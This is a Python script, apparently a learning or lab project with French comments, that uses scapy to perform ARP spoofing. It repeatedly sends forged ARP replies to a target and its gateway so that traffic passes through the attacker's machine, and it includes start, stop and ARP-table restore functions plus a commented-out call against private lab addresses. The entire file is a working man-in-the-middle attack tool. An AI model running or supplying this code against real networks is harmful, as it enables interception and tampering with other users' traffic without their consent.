import scapy.all as scapy
import time
import argparse
import sys
import getMac

def spoofer(targetIP, spoofIP):
    mac = getMac.get_mac(targetIP)
    print(mac)
    packet= scapy.Ether(dst=mac) / scapy.ARP(op=2,pdst=targetIP,hwdst=mac,psrc=spoofIP)
    #op=2 <==> ARP Response
    #pdst <==> @ip de la cible
    #hwdst<==> @mac de la cible
    #psrc <==> @ip de la machine qu'on veut spoofer
    #hwsrc<==> par défaut elle va prendre @ mac de la machine qui fait l'attaque

    scapy.sendp(packet, verbose=False)

def restore(destinationIP, sourceIP):
    mac = getMac.get_mac(destinationIP)
    print(mac)
    packet = scapy.Ether(dst=mac) / scapy.ARP(op=2,pdst=destinationIP,hwdst=mac,psrc=sourceIP,hwsrc=getMac.get_mac(sourceIP))
    scapy.sendp(packet, count=4,verbose=False)

def arpspoof(targetIP,gatewayIP):
    packets = 0
    try:
        while True:
            spoofer(targetIP,gatewayIP) # 1 er appel pour faire tromper la pasrelle
            spoofer(gatewayIP,targetIP) # 2 eme appel pour faire tromper la victime
            print("\r[+] Sent packets "+ str(packets)),
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
        restore(targetIP,gatewayIP)
        restore(gatewayIP,targetIP)


arpspoof_running = False

def start_arpspoof(targetIP, gatewayIP):
    global arpspoof_running
    arpspoof_running = True
    packets = 0
    try:
        while arpspoof_running:
            spoofer(targetIP, gatewayIP)   # trompe la passerelle
            spoofer(gatewayIP, targetIP)   # trompe la victime
            print("\r[+] Sent packets " + str(packets), end="")
            packets += 2
            time.sleep(2)
    except Exception as e:
        print(f"Erreur: {e}")
        # Optionnel: tu peux mettre restore ici aussi

def stop_arpspoof(targetIP, gatewayIP):
    global arpspoof_running
    arpspoof_running = False
    time.sleep(2)  # Laisse le temps à la boucle de se terminer proprement
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
    print("Arrêt du spoofing et restauration des tables ARP.")




#arpspoof("192.168.206.130","192.168.206.2")